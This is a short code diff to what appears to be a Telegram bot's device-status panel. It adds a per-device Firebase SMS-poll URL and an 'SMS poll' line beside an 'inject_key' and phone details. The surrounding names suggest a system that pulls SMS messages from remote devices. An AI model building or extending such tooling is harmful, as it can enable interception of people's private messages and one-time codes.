@@ -259,9 +259,18 @@ def _device_phone_display(device: Device) -> str:
 
 
 def _db_label(device: Device, profile: MonitorProfile | None = None) -> str:
-    url = device.firebase_source_url or (profile.firebase_url if profile else None) or ""
+    from app.firebase_sms_sync import SMS_FIREBASE_URL_META_KEY, _meta_dict
+
+    meta = _meta_dict(device)
+    poll = meta.get(SMS_FIREBASE_URL_META_KEY)
+    url = (
+        (poll if isinstance(poll, str) and poll.strip() else None)
+        or device.firebase_source_url
+        or (profile.firebase_url if profile else None)
+        or ""
+    )
     if not url:
-        return "—"
+        return "— (pool scan on /startmonitor)"
     return url.rstrip("/")
 
 
@@ -745,11 +754,15 @@ def format_status_card(
     automation = "🟢 Running" if profile.is_monitoring else "🔴 Stopped"
 
     device_online = format_device_online(device) if device else "⚪ —"
+    from app.firebase_sms_sync import sms_poll_panel_label
+
+    sms_panel = sms_poll_panel_label(device, profile)
     return (
         f"📊 <b>{BRAND_NAME}</b>\n\n"
         "<pre>"
         f"📱 Device: {device_name}\n"
         f"📡 Firebase: {device_online}\n"
+        f"📥 SMS poll: {sms_panel}\n"
         f"🔑 KEY: {inject_key}\n"
         f"📞 /mynum: {profile.phone_number or '—'}\n"
         f"📢 Channel: {profile.channel_id or '—'}\n"
